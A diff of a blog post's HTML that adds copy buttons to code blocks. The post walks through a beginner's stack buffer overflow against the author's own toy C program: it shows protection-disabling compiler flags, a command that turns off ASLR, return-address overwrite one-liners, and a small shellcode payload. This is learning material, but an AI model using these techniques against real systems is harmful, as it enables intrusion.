@@ -53,7 +53,7 @@ I read about it and understood the mechanism, but never accomplished writing a r
 <a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" class="external-link" target="_blank">dhavalkapil.com</a></p>
 <p>So, I will basically repeat the steps in the article and build my first own buffer overflow program.</p>
 <h1 id="the-program" tabindex="-1">1. The program <a class="header-anchor" href="#the-program" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
-<pre class="language-c"><code data-filename="buffer-overflow.c" class="language-c"><span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></span>
+<pre class="language-c"><code data-filename="buffer-overflow.c" class="language-c"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></span>
 <span class="highlight-line"></span>
 <span class="highlight-line"><span class="token keyword">void</span> <span class="token function">secretFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
 <span class="highlight-line"><span class="token punctuation">{</span></span>
@@ -86,18 +86,18 @@ We need to find the right location and overwrite it.</p>
 <p>We need to set special compiler flags to disable any security checks.
 It is great the compilers today have that built-in checks, but disabling them makes it easier to grasp the concepts
 and maybe understand why those checks have been added over time.</p>
-<pre class="language-bash"><code class="language-bash"><span class="highlight-line">gcc <span class="token parameter variable">-m32</span> -fno-stack-protector -no-pie <span class="token parameter variable">-zexecstack</span> buffer-overflow.c <span class="token parameter variable">-o</span> buffer-overflow</span></code></pre>
+<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">gcc <span class="token parameter variable">-m32</span> -fno-stack-protector -no-pie <span class="token parameter variable">-zexecstack</span> buffer-overflow.c <span class="token parameter variable">-o</span> buffer-overflow</span></code></pre>
 <p>Run this to disable ASLR (see below):</p>
-<pre class="language-bash"><code class="language-bash"><span class="highlight-line"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space</span></code></pre>
+<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space</span></code></pre>
 <p>I've used gcc 11.1.0 in this example.</p>
 <h1 id="running-and-crashing-the-program" tabindex="-1">3. Running and crashing the program <a class="header-anchor" href="#running-and-crashing-the-program" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
 <p>This works fine:</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow </span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow </span></span></span>
 <span class="highlight-line"><span class="token output">Enter some text:</span>
 <span class="highlight-line">Test</span>
 <span class="highlight-line">You entered: Test</span></code></pre>
 <p>A text more than 20 characters crashes the program, as expected:</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow</span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow</span></span></span>
 <span class="highlight-line"><span class="token output">Enter some text:</span>
 <span class="highlight-line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
 <span class="highlight-line">You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
@@ -119,7 +119,7 @@ In order to do that, we need to know it's address.</p>
 <p>We can either do it in edb (CTRL+ALT+S):</p>
 <img src="/blog/2022-02-16-buffer-overflow/edb-symbols.png" width="506" height="319" alt="undefined">
 <p>or via gdb:</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">gdb <span class="token parameter variable">-batch</span> <span class="token parameter variable">-ex</span> <span class="token string">"info functions"</span> <span class="token parameter variable">-ex</span> quit ./buffer-overflow</span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">gdb <span class="token parameter variable">-batch</span> <span class="token parameter variable">-ex</span> <span class="token string">"info functions"</span> <span class="token parameter variable">-ex</span> quit ./buffer-overflow</span></span></span>
 <span class="highlight-line"><span class="token output">All defined functions:</span>
 <span class="highlight-line"></span>
 <span class="highlight-line">Non-debugging symbols:</span>
@@ -154,7 +154,7 @@ Note: I suppose to work on a little-endian machine. If you work on a big-endian 
 <p><code class="language-plain">0xce3c - 0xce3c = 0x20</code>, which is 32 in decimal.
 We need to write 32 bytes (any bytes) followed by 0x08049196 into the <code class="language-plain">buffer</code> variable, and we should reach our goal:
 (See <a href="https://stackoverflow.com/questions/66258454/printing-non-ascii-characters-in-python3" class="external-link" target="_blank">here</a> why we can't use print())</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")'</span> <span class="token operator">|</span> ./buffer-overflow </span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")'</span> <span class="token operator">|</span> ./buffer-overflow </span></span></span>
 <span class="highlight-line"><span class="token output">Enter some text:</span>
 <span class="highlight-line">You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��</span>
 <span class="highlight-line">Congratulations!</span>
@@ -166,12 +166,12 @@ instead of executing code which already exists in the binary.</p>
 <h1 id="executing-own-code" tabindex="-1">7. Executing own code <a class="header-anchor" href="#executing-own-code" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
 <p>If we replace the RETURN address with the beginning of the buffer variable <code class="language-plain">ffff:ce1c</code>,
 the input we entered will be treated as binary instructions and is executed:</p>
-<pre class="language-bash"><code class="language-bash"><span class="highlight-line">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x1c\xce\xff\xff")'</span> <span class="token operator">|</span> ./buffer-overflow</span></code></pre>
+<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x1c\xce\xff\xff")'</span> <span class="token operator">|</span> ./buffer-overflow</span></code></pre>
 <p>This fails with <em>SIGILL, Illegal instruction</em>. This is expected, as our <em>aaaaaa..</em> test string is not valid
 machine code.</p>
 <p>To generate it, we can use <a href="(https://archlinux.org/packages/extra/x86_64/yasm/)" class="external-link" target="_blank">yasm</a> for example.</p>
 <h1 id="creating-the-code-payload" tabindex="-1">8. Creating the code payload <a class="header-anchor" href="#creating-the-code-payload" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
-<pre class="language-nasm"><code data-filename="payload.asm" class="language-nasm"><span class="highlight-line"><span class="token keyword">BITS 32</span></span>
+<pre class="language-nasm"><code data-filename="payload.asm" class="language-nasm"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token keyword">BITS 32</span></span>
 <span class="highlight-line">BUFFER_ADDRESS EQU <span class="token number">0xffffce1c</span> <span class="token comment">; The address of the buffer variable in memory</span></span>
 <span class="highlight-line">ORG BUFFER_ADDRESS</span>
 <span class="highlight-line"><span class="token keyword">SECTION .text</span></span>
@@ -185,9 +185,9 @@ machine code.</p>
 <span class="highlight-line">JMP <span class="token number">0x0804923d</span> <span class="token comment">; buffer-overflow!main</span></span>
 <span class="highlight-line"><span class="token label function">message:</span> db <span class="token string">"XX"</span>,<span class="token number">0xff</span></span>
 <span class="highlight-line">dd BUFFER_ADDRESS <span class="token comment">; RETURN address</span></span></code></pre>
-<pre class="language-bash"><code class="language-bash"><span class="highlight-line">yasm <span class="token parameter variable">--arch</span><span class="token operator">=</span>x86 <span class="token parameter variable">--machine</span><span class="token operator">=</span>x86 <span class="token parameter variable">--objfile</span><span class="token operator">=</span>payload.bin payload.asm</span></code></pre>
+<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">yasm <span class="token parameter variable">--arch</span><span class="token operator">=</span>x86 <span class="token parameter variable">--machine</span><span class="token operator">=</span>x86 <span class="token parameter variable">--objfile</span><span class="token operator">=</span>payload.bin payload.asm</span></code></pre>
 <p>For disassembly, I found <code class="language-plain">objdump</code> useful:</p>
-<pre class="language-bash"><code class="language-bash"><span class="highlight-line">objdump --disassemble-all --disassembler-options<span class="token operator">=</span>intel,i386 <span class="token parameter variable">--target</span><span class="token operator">=</span>binary <span class="token parameter variable">--architecture</span> i386 payload.bin</span></code></pre>
+<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">objdump --disassemble-all --disassembler-options<span class="token operator">=</span>intel,i386 <span class="token parameter variable">--target</span><span class="token operator">=</span>binary <span class="token parameter variable">--architecture</span> i386 payload.bin</span></code></pre>
 <p>The EBP got overwritten by the too long input.
 It was stored on the stack, and the leave instruction tried to restore it.
 In order to not crash the program, we need to restore it.
@@ -200,7 +200,7 @@ and only the payload writes a 0x00 at the end of the string during runtime.</p>
 <p>Second note: The payload length must be exactly 36 bytes.
 Or at least we need to make sure the RETURN address is written to offset 0x20.</p>
 <p>With that payload, the program prints an additional line &quot;XX&quot; and then quits without crashing!</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cat</span> payload.bin <span class="token operator">|</span> ./buffer-overflow</span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cat</span> payload.bin <span class="token operator">|</span> ./buffer-overflow</span></span></span>
 <span class="highlight-line"><span class="token output">Enter some text:</span>
 <span class="highlight-line">You entered: �9����P����P�!�H����XX����</span>
 <span class="highlight-line">XX</span>
@@ -243,7 +243,7 @@ In our example, we explicitly marked the stack as executable via <code class="la
 </ul>
 <p>In the real-world we would need to bypass all of those measures.</p>
 <p>To check which measures are enabled, you can use <a href="https://github.com/slimm609/checksec.sh" class="external-link" target="_blank">checksec</a>:</p>
-<pre class="language-shell-session"><code class="language-shell-session"><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>./buffer-overflow</span></span></span>
+<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>./buffer-overflow</span></span></span>
 <span class="highlight-line"><span class="token output">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span>
 <span class="highlight-line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50) Symbols	  No	0		1		./buffer-overflow</span></code></pre>
 
